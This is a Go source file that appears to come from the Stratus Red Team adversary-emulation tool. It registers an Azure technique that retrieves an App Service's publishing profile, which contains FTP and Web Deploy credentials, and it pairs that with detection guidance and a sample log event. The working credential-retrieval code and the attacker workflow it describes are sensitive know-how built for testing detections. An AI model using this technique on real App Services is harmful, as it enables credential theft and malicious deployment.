package azure

import (
	"context"
	_ "embed"
	"errors"
	"io"
	"log"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/appservice/armappservice/v4"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.credential-access.app-service-publishing-credentials",
		FriendlyName: "Retrieve App Service Publishing Credentials",
		Description: `
Retrieves the publishing profile of an Azure App Service (Web App), which contains FTP and Web Deploy credentials in cleartext.

An attacker with read-or-higher access to an App Service can call the ` + "`publishxml`" + ` ARM action to download the publishing profile, without needing access to any Key Vault or secret store. The returned XML document contains ` + "`userName`" + ` and ` + "`userPWD`" + ` attributes that grant direct FTP and Web Deploy access to the application host. These credentials can then be used for lateral movement or to deploy malicious code to the running application.

This technique was observed in the STORM-2949 intrusion, where the threat actor harvested App Service publishing credentials to move from a compromised identity into application hosts.

Warm-up:

- Create an Azure App Service (Linux Web App)

Detonation:

- Call the ` + "`listPublishingProfileXMLWithSecrets`" + ` action on the App Service to retrieve the publishing profile containing FTP and Web Deploy credentials
`,
		Detection: `
Identify the <code>Microsoft.Web/sites/publishxml/action</code> operation in Azure Activity logs.

Sample event (redacted for clarity):

` + codeBlock + `json hl_lines="6"
{
  "resourceId": "/SUBSCRIPTIONS/<your-subscription-id>/RESOURCEGROUPS/STRATUS-RED-TEAM-ASP-CRED-RG/PROVIDERS/MICROSOFT.WEB/SITES/SRT-ASP-CRED",
  "evt": {
    "category": "Administrative",
    "outcome": "Success",
    "name": "MICROSOFT.WEB/SITES/PUBLISHXML/ACTION"
  },
  "level": "Information",
  "properties": {
    "message": "Microsoft.Web/sites/publishxml/action",
    "eventCategory": "Administrative",
    "entity": "/subscriptions/<your-subscription-id>/resourceGroups/stratus-red-team-asp-cred-rg/providers/Microsoft.Web/sites/srt-asp-cred"
  }
}
` + codeBlock + `

Note that this operation is logged even when the App Service has only basic (publishing) authentication disabled, since the action is evaluated before authentication settings are honored.
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.CredentialAccess},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	appServiceName := params["app_service_name"]
	resourceGroup := params["resource_group_name"]

	webAppsClient, err := getAzureWebAppsClient(providers.Azure())
	if err != nil {
		return errors.New("unable to instantiate Azure web apps client: " + err.Error())
	}

	log.Println("Retrieving publishing credentials for App Service " + appServiceName)
	response, err := webAppsClient.ListPublishingProfileXMLWithSecrets(
		context.Background(),
		resourceGroup,
		appServiceName,
		armappservice.CsmPublishingProfileOptions{},
		nil,
	)
	if err != nil {
		return errors.New("unable to retrieve App Service publishing credentials: " + err.Error())
	}
	defer response.Body.Close()

	publishingProfile, err := io.ReadAll(response.Body)
	if err != nil {
		return errors.New("unable to read App Service publishing profile: " + err.Error())
	}

	_ = publishingProfile // contains the FTP and Web Deploy credentials in cleartext
	log.Println("Successfully retrieved publishing credentials for App Service " + appServiceName)
	return nil
}

func getAzureWebAppsClient(azure *providers.AzureProvider) (*armappservice.WebAppsClient, error) {
	return armappservice.NewWebAppsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}
